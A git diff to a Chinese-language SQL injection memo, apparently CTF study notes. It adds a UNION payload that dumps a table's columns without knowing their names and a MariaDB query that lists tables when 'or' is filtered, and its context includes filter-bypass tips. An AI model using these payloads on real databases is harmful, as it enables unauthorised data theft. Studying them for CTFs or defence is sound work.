@@ -202,7 +202,22 @@ EXECUTE sqla;  //执行预定义SQL语句
 - SELECT 1 WHERE 1 = 1 ó SELECT 1 WHERE 1 LIKE "1"
   - SELECT 1 WHERE 1 < 10 ó SELECT 1 WHERE 1 BETWEEN (0, 10)
 -   union select 被过滤 => 用union all select 来绕过
--  
+
+
+
+
+
+### 在不知道段名的情况下查找
+
+```
+select * from flags where id='abcdd' union select 1,(select group_concat(b,e,f,g) from ( select 1 as e,2 as f,3 as g,4 as b union select*from flags) x ),3,4;
+```
+
+
+
+
+
+
 
 ## 注入语句备忘 
 
@@ -515,3 +530,12 @@ SELECT temp_function();
  https://www.anquanke.com/post/id/155328 
 
  https://skysec.top/2018/07/30/ISITDTU-CTF-Web/#Access-Box 
+
+
+
+## mariadb
+
+### 过滤or的情况下查询表名
+
+` select*/**/*group_concat(table_name)*/**/*from*/**/*mysql.innodb_table_stats `
+
